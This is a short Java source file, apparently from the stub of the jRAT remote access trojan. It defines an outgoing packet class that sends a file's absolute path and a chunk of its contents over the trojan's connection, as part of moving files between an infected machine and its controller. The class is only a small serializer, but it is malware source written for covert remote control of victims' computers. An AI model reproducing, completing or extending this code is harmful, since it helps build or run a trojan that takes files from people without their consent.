package se.jrat.stub.packets.outgoing;

import java.io.DataOutputStream;
import java.io.File;

import se.jrat.common.io.StringWriter;
import se.jrat.stub.Connection;


public class Packet29ClientUploadPart extends AbstractOutgoingPacket {

	private File file;
	private byte[] part;
	private int to;
	
	public Packet29ClientUploadPart(File file, byte[] part, int to) {
		this.file = file;
		this.part = part;
		this.to = to;
	}

	@Override
	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
		sw.writeLine(file.getAbsolutePath());

		dos.writeInt(to);
		dos.write(part, 0, to);
	}

	@Override
	public byte getPacketId() {
		return 29;
	}

}
